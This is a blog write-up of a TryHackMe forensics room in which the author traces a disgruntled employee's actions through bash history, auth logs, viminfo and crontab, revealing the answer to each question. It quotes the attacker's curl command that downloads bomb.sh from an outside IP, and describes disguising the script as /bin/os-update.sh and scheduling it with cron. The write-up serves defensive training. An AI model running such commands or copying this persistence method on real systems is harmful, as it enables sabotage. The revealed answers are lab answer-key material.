---
author: Ricard Alcaraz Mancebo
title: Disgruntled - TryHackMe
tags:
  - Cybersecurity
  - Blue Team
  - TryHackMe
languages:
  - bash
image:
  url: https://media.licdn.com/dms/image/v2/D5612AQEpu6WL353Q2Q/article-cover_image-shrink_600_2000/B56ZbJP3kWHgAQ-/0/1747133102751?e=2147483647&v=beta&t=3XgE4Ec0863gXPM0ILKSOaO38bBe8u4a82kxiMl-7wE
  alt: logo
description: My notes solving Disgruntled - TryHackMe
pubDate: 2025-09-29T19:21:00.000+02:00
---
## Scenario

Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

## Documents Provided

- Virtual Machine

## Q1: The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

We have a clue on the task, we should check the history of the commands executed, this information can be found in the user's folder on the file `.bash_history`, we already know the user which name is CyberT, if we do a `cat` of the file we will find the answer. However we need to know the full path of the tool to install the package, once we have it we will have the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    /usr/bin/apt install dokuwiki
  </div>
</details>

## Q2: What was the present working directory (PWD) when the previous command was run?

We are already in looking at the file, looking at the commands before the installation of the package we dons see any changes on the directory so we can assume which one is in.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    /home/cybert
  </div>
</details>

## Q3: Which user was created after the package from the previous task was installed?

In the same file as before we can search the commands executed after the installation of the package, there we just need to search for a user creation, and once we found it we can also find the username.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    it-admin
  </div>
</details>

## Q4: A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

For this one we can check the `/var/log/auth.log` in my case inside `auth.log.1` there we can also add a filter using grep to search for the `visudo` command that modified the sudoers file, and we will find the answer looking for this commnad executed by the cybert user.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Dec 28 06:27:34
  </div>
</details>

## Q5: A script file was opened using the "vi" text editor. What is the name of this file?

We are already in the proper file, if we search for `vi` now we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    bomb.sh
  </div>
</details>

## Q6: What is the command used that created the file bomb.sh?

Before analyzing the `.bash_history` we can see that there is a change in user, to the created user. We can check the commands executed by the new user, there we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    curl 10.10.158.38:8080/bomb.sh --output bomb.sh
  </div>
</details>

## Q7: The file was renamed and moved to a different directory. What is the full path of this file now?

For this one I just checked the `bin` folder since it locates executables and the attacker might want to save it there, then I checked the ones that are scripts `.sh` and I found one with a suspicious name, after looking at the content of it I found it.
The proper way is since we have seen that it opens vi, we may found something on the vim logs at `/home/it-admin/.viminfo` and there we can found it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    /bin/os-update.sh
  </div>
</details>

## Q8: When was the file from the previous question last modified? (Format: Month Day HH:MM)

Now we can run the command `stat` to the previous file and we will find this information.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Dec 28 06:29
  </div>
</details>

## Q9: What is the name of the file that will get created when the file from the first question executes?

We just have to check the content of the script and we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    goodbye.txt
  </div>
</details>

## Q10: At what time will the malicious file trigger? (Format: HH:MM AM/PM)

Already we have seen that the attacker changes the `crontab` file, so we can just check for any suspicious change there, and we will find the time it will trigger in crontab format, we just have to translate it to the format for the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    08:00 AM
  </div>
</details>

